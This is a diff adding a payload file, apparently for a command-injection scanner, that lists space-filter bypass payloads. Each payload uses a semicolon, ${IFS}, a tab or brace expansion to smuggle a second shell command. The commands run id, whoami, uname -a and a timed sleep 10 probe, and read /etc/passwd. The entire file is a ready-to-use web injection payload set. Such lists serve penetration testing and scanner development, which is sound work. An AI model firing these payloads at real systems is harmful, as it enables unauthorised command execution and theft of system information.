@@ -1,0 +1,36 @@
+# @default_os:     linux
+# @default_signal: system:linux_id
+# @default_blind:  false
+# @default_tier:   5
+#
+# Space-filter bypass payloads.
+# Triggered when filter: no_space detected in error response.
+# Technique: replace spaces with ${IFS}, tab (\t), or brace expansion.
+
+# @label: IFS id
+;${IFS}id
+
+# @label: IFS whoami
+# @signal: system:linux_user
+;${IFS}whoami
+
+# @label: Tab id
+# @blind: false
+;	id
+
+# @label: Brace exec id (no space)
+# @signal: system:linux_id
+;{id,}
+
+# @label: Brace cat passwd (no space)
+# @signal: linux_passwd
+;{cat,/etc/passwd}
+
+# @label: IFS sleep 10
+# @signal: time
+# @blind: true
+;${IFS}sleep${IFS}10
+
+# @label: IFS uname
+# @signal: system:linux_uname
+;${IFS}uname${IFS}-a
